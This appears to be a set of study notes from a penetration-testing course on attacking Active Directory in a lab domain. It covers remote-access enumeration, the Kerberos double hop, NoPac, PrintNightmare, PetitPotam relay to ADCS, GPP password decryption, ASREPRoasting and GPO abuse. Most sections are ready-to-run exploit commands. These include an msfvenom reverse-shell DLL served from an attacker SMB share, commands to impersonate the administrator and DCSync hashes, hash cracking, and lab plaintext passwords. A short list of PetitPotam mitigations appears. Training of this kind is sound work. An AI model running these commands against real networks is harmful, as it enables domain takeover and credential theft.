# Privileged Access

We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:

- [CanRDP](https://bloodhound.specterops.io/resources/edges/can-rdp)
- [CanPSRemote](https://bloodhound.specterops.io/resources/edges/can-ps-remote)
- [SQLAdmin](https://bloodhound.specterops.io/resources/edges/sql-admin)

We can also enumerate these privileges using tools such as PowerView and even built-in tools.
#### Enumerating a Local Group on a Host

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```
#### Checking Remote Access Rights using BloodHound

We can utilize BloodHound Built-in queries such as `Find Workstations where Domain Users can RDP` or `Find Servers where Domain Users can RDP`

## WinRM
#### Enumerating the Remote Management Users Group

```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```

We can also right a custom **Cipher Query** in `BloodHound` to hunt for users with this type of access.

```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```
#### Establishing WinRM Session from Windows

```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)

Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

From the Linux host we can use `evil-winrm` tool.

## SQL Server Admin

A custom Cipher query on BloodHound to find `SQL Admin Rights`

```powershell
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```

```ad-resources
[PowerUpSQL Cheat Sheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
```

#### Enumerating MSSQL Instances with PowerUpSQL

```powershell
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
```

```powershell
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

We can also use `Impacket mssqlclient.py`

```sh
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
```

We can run commands in the format `xp_cmdshell <command>`. Here we can enumerate the rights that our user has on the system and see that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege), which can be leveraged in combination with a tool such as [JuicyPotato](https://github.com/ohpe/juicy-potato), [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), or [RoguePotato](https://github.com/antonioCoco/RoguePotato) to escalate to `SYSTEM` level privileges, depending on the target host, and use this access to continue toward our goal.

---
# Kerberos "Double Hop" Problem

**1. The Core Problem:**
- Occurs when trying to authenticate from one remote machine to another (e.g., Attacker -> Server A -> Server B).
- Even with valid credentials and permissions, the second "hop" (Server A -> Server B) fails.
- Commonly seen with WinRM/PowerShell remote sessions.

**2. The Cause (Why it Happens with WinRM/Kerberos):**
- WinRM uses Kerberos authentication, which provides a **service ticket** specific to the first hop (Server A).
- Crucially, the user's credentials (like a password or NTLM hash) are **not cached** in the remote session on Server A.
- Without cached credentials, Server A cannot prove the user's identity to Server B. It only has a ticket valid for itself.

**3. Comparison with Other Authentication Methods (e.g., PSExec):**
- Tools like PSExec often use authentication methods (like SMB) that **do cache the user's NTLM hash** in memory on the remote machine (Server A).
- When a second hop is attempted, Server A can use this cached hash to authenticate to Server B on the user's behalf.
- This is why the "Double Hop" problem is less common with tools like PSExec but frequent with default WinRM sessions.
## Workarounds

```ad-resources
[Kerberos Double-Hop Workarounds](https://posts.slayerlabs.com/double-hop/)
```
### Workaround #1: PSCredential Object

We can connect to *Remote Host* via *Host A* and set up `PSCredentials` Object to pass our credentials again.
### Workaround #2: Register PSSession Configuration

We can use here is registering a new session configuration using the [Register-PSSessionConfiguration](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/register-pssessionconfiguration?view=powershell-7.2) cmdlet.

```PowerShell
Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm
```

Once this is done, we need to restart the WinRM Service by typing:

```PowerShell
Restart-Service WinRM
```

We can also use other methods such as CredSSP, port forwarding, or injecting into a process running in the context of a target user.

---
# Bleeding Edge Vulnerabilities
## NoPac (SamAccountName Spoofing)
This vulnerability encompasses two CVEs [2021-42278](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42278) and [2021-42287](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42287), allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.

|42278|42287|
|---|---|
|`42278` is a bypass vulnerability with the Security Account Manager (SAM).|`42287` is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.|
We can use this [tool](https://github.com/Ridter/noPac) to perform this attack.
#### Scanning for NoPac

```sh
sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap
```
#### Running NoPac & Getting a Shell

```sh
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap
```
#### Using noPac to DCSync the Built-in Administrator Account

```sh
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

## PrintNightmare
PrintNightmare is a nickname for two CVEs ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in **PrintSpooler** service.
#### Cloning the Exploit

```sh
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

```ad-warning
For cube0x0 exploit to work, we'll need to use the same version of Impacket suite used required by the exploit.
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.
#### Enumerating for MS-RPRN

```sh
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

# Expected Output
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol
```

After confirming this, we can start by crafting our payload
#### Generating a DLL Payload

```sh
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

After that, we can host our payload in an SMB Share we create on our attack host
#### Creating a Share with smbserver.py

```sh
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

After hosting the payload, configure a **Metasploit Multi Handler** to receive the reverse connection

Then we can run our exploit
#### Running the Exploit

```sh
sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

## PetitPotam (MS-EFSRPC)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability

It allows an unauthenticated user to coerce a DC to authenticate against another host using NTLM over port 445 via  [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc).  This will allow an attacker to take over Windows domain where **ADCS** is in use. In the attack, an authentication request will be relayed to the **Certificate Authority (CA)** host's **Web Enrollment Page** and makes a **Certificate Signing Request (CSR)** for a new digital certificate.

After that, the certificate can be used with tools such as `Rubeus` and `gettgtpkinit.py` from  [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.
#### Starting ntlmrelayx.py

If we didn't know the location of the CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

```sh
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```

In another window now we run the `petitpotam.py`

```python
python3 PetitPotam.py <attack host IP> <Domain Controller IP>
```

There's also an executable version that can be run from a Windows host. There's also a PowerShell implementation of the tool.

Back in the `ntlmrelayx` terminal, we can see a successful authentication attempt

![[PetitPotam exploit.png]]
#### Requesting a TGT Using gettgtpkinit.py

Next, we can take the `base64` certificate and use `gettgtpkinit.py` to request a TGT for the DC.

```sh
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache
```
#### Setting the KRB5CCNAME Environment Variable

```sh
export KRB5CCNAME=dc01.ccache
```
#### Using Domain Controller TGT to DCSync

```sh
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
#### Submitting a TGS Request for Ourselves Using getnthash.py

```sh
python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
#### Requesting TGT and Performing PTT with DC01$ Machine Account

```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt
```
### PetitPotam Mitigations

- Patch the CVE
- To prevent NTLM relay attacks, use [Extended Protection for Authentication](https://docs.microsoft.com/en-us/security-updates/securityadvisories/2009/973811) along with enabling [Require SSL](https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429) to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- [Disabling NTLM authentication](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain) for Domain Controllers
- Disabling NTLM on AD CS servers using [Group Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-incoming-ntlm-traffic)
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services are in use

---

# Miscellaneous Misconfigurations

## Exchange Related Group Membership

```ad-resources
This [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details a few techniques for leveraging Exchange for escalating privileges in an AD environment.
```

The group **Exchange Windows Permissions** is not listed as a <span style="color:rgb(0, 176, 80)">protected group</span>, but members are granted the ability to **write a DACL** to the Domain Object. This can leveraged to give a user DCSync Privileges.

There's another extremely powerful group too called **Organization Management** (Effectively the "Domain Admins" of Exchange) that can access the mailboxes of all domain users. The group has also full control of the OU called **Microsoft Exchange Security Groups**, which contains the group **Exchange Windows Permissions**.

```ad-info
If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.
```

## PrivExchange

The `PrivExchange` attack results from a flaw in Exchange Server `PushSubscipition` feature which allows any domain user with a mailbox to force the Exchange server to authenticate to any host provided by the client over HTTP.

## Printer Bug

This is a flaw in the MS-RPRN protocol. This protocol defines the communication of print job processing and print system management between a client and a print server.

This attack can be leveraged to relay LDAP and grant the attacker account DCSync privileges.

The attack can also be leveraged to relay LDAP authentication and grant **Resource Based Constrained Delegation (RBCD)** for the victim to a computer account under our control.

The attack can be leveraged to compromise a DC in a partner domain/forest.

```ad-note
We can leverage the `Get-SpoolStatus` function from `SecurityAssessment.ps1` as preserved in [this](https://github.com/itzvenom/Security-Assessment-PS) repository or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool to check for machines vulnerable to the [MS-PRN Printer Bug](https://blog.sygnia.co/demystifying-the-print-nightmare-vulnerability).
```
#### Enumerating for MS-PRN Printer Bug

```powershell
Import-Module .\SecurityAssessment.ps1
Get-SpoolerStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```

## MS14-068

This is a flaw in Kerberos protocol. The vulnerability allowed a forged PAC to be accepted by the KDC as legitimate.

It can be exploited with tools such as the [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek) or the Impacket toolkit

## Sniffing LDAP Credentials

```ad-resources
[It’s just a printer… What’s the worst that could happen? – GrimBlog](https://grimhacker.com/2018/03/09/just-a-printer/)
```

We can use a tool such as [adidnsdump](https://github.com/dirkjanm/adidnsdump) to enumerate all DNS records in a domain using a valid domain user account.

```ad-tldr
This would help to identify hostnames from `SRV01934.INLANEFREIGHT.LOCAL` to `JENKINS.INLANEFREIGHT.LOCAL` as an example
```

The tool works because, by default, all users can list the child objects of a DNS zone in an AD environment.

```ad-resources
The background and more in-depth explanation of this tool and technique can be found in this [post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).
```
#### Using adidnsdump

```sh
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
```
#### Using the -r Option to Resolve Unknown Records

```sh
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
```

## Other Misconfigurations

### Password in Description Field

```powershell
Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}
```

## PASSWD_NOTREQD Field
#### Checking for PASSWD_NOTREQD Setting using Get-DomainUser

```powershell
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
```

## Credentials in SMB Shares and SYSVOL Scripts

We can check for SYSVOL shares that might contain old passwords or left scripts that will contain critical data.

## Group Policy Preferences (GPP) Passwords

**Patch Information (MS14-025):**  
While a 2014 patch prevents administrators from _creating new_ GPPs with passwords, it **does not** remove existing, vulnerable XML files from SYSVOL. Therefore, this vulnerability is still commonly found in older or unmaintained environments.
#### Attack Path & Tools

The goal is to find these XML files in SYSVOL, extract the `cpassword` value, and decrypt it.

**1. Manual Discovery & Decryption**

- Browse the SYSVOL share: `\\<DC_IP>\SYSVOL\<DOMAIN_NAME>\Policies\`
- Look for files like `Groups.xml`, `Drives.xml`, `Services.xml`, `ScheduledTasks.xml`.
- If you find a `cpassword`, use `gpp-decrypt` to get the plaintext:

```shell
gpp-decrypt <cpassword-string>
```

**2. Automated Discovery (PowerSploit)**

- Use the `Get-GPPPassword.ps1` script from the PowerSploit framework to automatically search SYSVOL and decrypt any found passwords.

```powershell
# Import the script
Import-Module .\Get-GPPPassword.ps1
    
# Run the function
Get-GPPPassword
```

**3. Automated Discovery (CrackMapExec)**

 CME has a dedicated module to find and decrypt GPP passwords.

```shell
crackmapexec smb <DC_IP> -u <user> -p <password> -M gpp_password
```

#### Related Misconfiguration: GPP Autologon

- **What it is:** GPOs can also be used to configure automatic logon for machines. These credentials are often stored in `Registry.xml` within SYSVOL.
- **The Flaw:** Unlike `cpassword`, these credentials are often stored in **cleartext**.
- **Tool (CrackMapExec):**

```shell
crackmapexec smb <DC_IP> -u <user> -p <password> -M gpp_autologin
```

**Pro Tip:** Even if the decrypted password belongs to a disabled or legacy account, always try it in a password spraying attack. Password reuse is extremely common, and this old password could grant you access to a currently active and privileged account.

## ASREPRoasting

It's possible to obtain the Ticket Granting Ticket (TGT) for any account that has the [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) setting enabled.

ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
#### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser

```powershell
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
```
#### Retrieving AS-REP in Proper Format using Rubeus

```powershell
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
```
#### Cracking the Hash Offline with Hashcat

```sh
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
```
#### Retrieving the AS-REP Using Kerbrute

```sh
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```
#### Hunting for Users with Kerberos Pre-auth Not Required

```sh
GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users
```

## Group Policy Object (GPO) Abuse

GPO misconfigurations can be abused to perform the following attacks:
- Adding additional rights to a user (such as SeDebugPrivilege, SeTakeOwnershipPrivilege, or SeImpersonatePrivilege)
- Adding a local admin user to one or more hosts
- Creating an immediate scheduled task to perform any number of actions

We can use tools such as PowerView and BloodHound.  We can also use [group3r](https://github.com/Group3r/Group3r), [ADRecon](https://github.com/sense-of-security/ADRecon), [PingCastle](https://www.pingcastle.com/), among others, to audit the security of GPOs in a domain.
#### Enumerating GPO Names with PowerView

```powershell
Get-DomainGPO |select displayname
```
#### Enumerating GPO Names with a Built-In Cmdlet

```powershell
Get-GPO -All | Select DisplayName
```
#### Enumerating Domain User GPO Rights

```powershell
$sid=Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}
```

We can use tools such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of GPOs misconfigurations.

